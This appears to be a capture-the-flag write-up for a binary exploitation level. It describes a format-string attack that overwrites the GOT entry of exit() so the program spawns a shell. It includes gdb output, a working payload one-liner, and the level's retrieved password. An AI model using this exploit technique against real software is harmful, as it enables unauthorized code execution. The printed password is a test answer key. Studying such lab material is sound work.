# Level5

In this binary we can see that function `o()` calls `/bin/sh` however it is not part of the execution flow     
We also notice that function `n()` called by `main` uses `printf` and `exit` 

Since RELRO (Relocation Read-Only) protection is off, we can use a *format string attack* to modify the *Global Offset Table*    
By replacing the .got.plt relocation address of `exit()` to `o()`, the `n()` function will call `o()` instead of `exit()` and open a shell prompt for us    

External function call -> PLT (Procedure Linkage Table) -> GOT (Global Offset Table)

First we must find `exit()` in the GOT
```
gdb level5
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) p *0x08049838 
$1 = 134513622	; 0x80483d6 this is the exit relocation address in the GOT that we want to replace with o() address
```

```
python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824d' + '%4\$n'" > /tmp/inj5
cat /tmp/inj5 - | ./level5 | tr -d " "
cat /home/user/level6/.pass
8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

